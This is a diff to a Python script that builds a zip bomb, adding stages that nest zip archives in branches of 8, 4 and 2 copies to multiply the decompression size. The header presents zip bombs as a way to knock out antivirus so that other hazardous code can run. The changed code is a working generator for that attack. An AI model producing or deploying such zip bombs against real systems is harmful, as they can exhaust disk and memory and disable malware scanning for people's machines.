@@ -1,7 +1,7 @@
 '''
 Joshua Franke
 Creates a Zip Bomb (without malicious code in it)
-Version: Alpha 
+Version: 1.0.0 
 
 A zipbomb is a series of highly compressed files that is used to shut down an
 antivirus so other hazardous code can run. Most modern antivirus programs
@@ -97,6 +97,44 @@ def copyNzip():
         os.rename(fl,fl2)
     zf.close()
     os.remove("16.zip")
+    os.rename("secondBranch.zip","0.zip")
+
+
+    # Second Branch
+    zf = zipfile.ZipFile("thirdBranch.zip","w")
+
+    for x in range(0,8):
+        fl = str(x) + ".zip"
+        fl2 = str(x+1) + ".zip"
+        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
+        os.rename(fl,fl2)
+    zf.close()
+    os.remove("8.zip")
+    os.rename("thirdBranch.zip","0.zip")
+
+    # Third Branch
+    zf = zipfile.ZipFile("fourthBranch.zip","w")
+
+    for x in range(0,4):
+        fl = str(x) + ".zip"
+        fl2 = str(x+1) + ".zip"
+        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
+        os.rename(fl,fl2)
+    zf.close()
+    os.remove("4.zip")
+    os.rename("fourthBranch.zip","0.zip")
+    
+    # Fourth Branch
+    zf = zipfile.ZipFile("fifthBranch.zip","w")
+
+    for x in range(0,2):
+        fl = str(x) + ".zip"
+        fl2 = str(x+1) + ".zip"
+        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
+        os.rename(fl,fl2)
+    zf.close()
+    os.remove("2.zip")
+    os.rename("fifthBranch.zip","0.zip")
 
 ###############################################################################
 
